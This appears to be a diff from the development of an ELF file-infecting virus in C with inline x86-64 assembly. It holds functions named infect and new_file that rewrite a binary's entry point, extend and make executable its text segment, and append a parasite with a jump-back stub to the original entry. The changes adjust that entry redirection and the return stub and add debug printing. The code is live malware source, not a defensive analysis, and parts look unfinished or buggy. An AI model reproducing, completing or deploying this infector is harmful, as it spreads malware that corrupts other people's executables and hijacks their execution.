@@ -40,7 +40,7 @@ struct linux_dirent64 {
  int             ft_strncmp(const char *s1, const char *s2, size_t n);
  int infect(char path[],size_t path_length);
  void new_file(char buf[],size_t size, size_t end_of_text,const char *path,Elf64_Addr old_e_entry);
- void	ft_putnbr(int nb);
+ void	ft_putnbr(long long nb);
  void		ft_putstr(char *s);
  int		ft_putchar(int c);
  int     ft_isdigit(int c);
@@ -122,14 +122,17 @@ _start()
 {
 	__asm__(".globl real_start\n"
 	        "real_start:\n"
-	       // "int3\n"
+	//"int3\n"
             "pushq %rax\n"
-			"pushq %rbx\n"
+			"pushq %rax\n"
+	        "pushq %rbx\n"
+		 "lea    -0xa(%rip),%rax \n"
+	"mov    %rax,0x10(%rsp)\n"
+
 			"pushq %rcx\n"
 			"pushq %rdx\n"
 			"pushq %rsi\n"
 			"pushq %rdi\n"
-
 			"pushq %r8\n"
 			"pushq %r9\n"
 			"pushq %r10\n"
@@ -140,7 +143,7 @@ _start()
 			"pushq %r15\n"
 
 		    "call do_main\n"
-//	        "int3\n"
+	  //      "int3\n"
 	        "jmp myend\n");
 
 }
@@ -256,7 +259,7 @@ bool process_runing(void)
 
 
 
-void	ft_putnbr(int nb)
+void	ft_putnbr(long long nb)
 {
 
 		if (nb < 0)
@@ -827,7 +830,6 @@ ft_putchar('\n');
 	Elf64_Shdr* shdr;
 	Elf64_Addr entry, payload_vaddr, text_end;
 
-
 	// Get the elf_header
 	hdr = (Elf64_Ehdr*) buff;
 
@@ -874,7 +876,15 @@ ft_putchar('\n');
 			text = phdr[i].p_offset;
 			text_end = phdr[i].p_offset + phdr[i].p_filesz;
 			payload_vaddr = phdr[i].p_vaddr + phdr[i].p_filesz;
-			hdr->e_entry = payload_vaddr + 63;
+
+			hdr->e_entry = payload_vaddr + 63 +0;
+
+			ft_putnbr( phdr[i].p_paddr + phdr[i].p_filesz);
+			ft_putchar(' ');
+			ft_putnbr(entry);
+
+			entry =  (phdr[i].p_paddr + phdr[i].p_filesz  + 63)- entry;
+
 			phdr[i].p_filesz += payload_len +100;
 			phdr[i].p_memsz += payload_len + 100;
 			phdr[i].p_flags |= PF_X;
@@ -941,8 +951,8 @@ void new_file(char buf[],size_t size, size_t end_of_text,const char *path,Elf64_
 {
 	int fd;
 	char tmp[125];
-	unsigned int parasite_size = ((char *)&myend - (char *)&real_start) + 30;
-	char jmp_code[7];
+	unsigned int parasite_size = ((char *)&myend - (char *)&real_start) +29;
+	char jmp_code[9];
 
 	jmp_code[0] = '\x68'; /* push */
 	jmp_code[1] = '\x00'; /* 00 	*/
@@ -952,10 +962,25 @@ void new_file(char buf[],size_t size, size_t end_of_text,const char *path,Elf64_
 	jmp_code[5] = '\xc3'; /* ret */
 	jmp_code[6] = 0;
 
+	jmp_code[0] = '\x81'; /* push */
+	jmp_code[1] = '\x2c'; /* 00 	*/
+	jmp_code[2] = '\x24'; /* 00	*/
+	jmp_code[3] = '\x00'; /* 00	*/
+	jmp_code[4] = '\x00'; /* 00	*/
+	jmp_code[5] = '\x00'; /* 00	*/
+	jmp_code[6] = '\x00'; /* 00	*/
+	jmp_code[7] = '\xc3'; /* ret */
+	jmp_code[8] = '\xc3';
+	Elf64_Ehdr* hdr = buf;
+
 	ft_putnbr(old_e_entry);
+	ft_putchar(' ');
+	ft_putnbr(get_eip());
+	ft_putchar('\n');
 	//exit(4);
-	*(unsigned int*) &jmp_code[1] = old_e_entry;
-	write(1,jmp_code,7);
+
+	*(unsigned int*) &jmp_code[3] = old_e_entry;
+	write(1,jmp_code,9);
 	char new_debut [4];
 	new_debut[0] ='n';
 	new_debut[1] ='e';
@@ -1017,7 +1042,7 @@ void new_file(char buf[],size_t size, size_t end_of_text,const char *path,Elf64_
 	//size_wrote += crypter(address_of_start_encrypt, parasite_size - 7 - (address_of_start_encrypt - address_of_start) , 56, fd);
 	ft_putchar('9');
 	ft_putchar('\n');
-	size_wrote += write(fd,jmp_code,7);
+	size_wrote += write(fd,jmp_code,9);
 	ft_putchar('1');ft_putchar('0');
 	ft_putchar('\n');
 	ft_putnbr(size_wrote); ft_putchar(' ');ft_putnbr(PAGE_SIZE); ft_putchar('\n');
@@ -1436,7 +1461,6 @@ unsigned long get_eip(void)
 void end_code() {
 __asm__(".globl myend\n"
         "myend:	     \n"
-//        "int3\n"
 		"popq %r15\n"
         "popq %r14\n"
         "popq %r13\n"
@@ -1450,7 +1474,8 @@ __asm__(".globl myend\n"
         "popq %rdx\n"
         "popq %rcx\n"
         "popq %rbx\n"
-        "popq %rax\n"
+		"popq %rax\n");
+asm(
         "mov $1,%rax \n"
         "mov $0,%rbx \n"
         "int $0x80   \n");
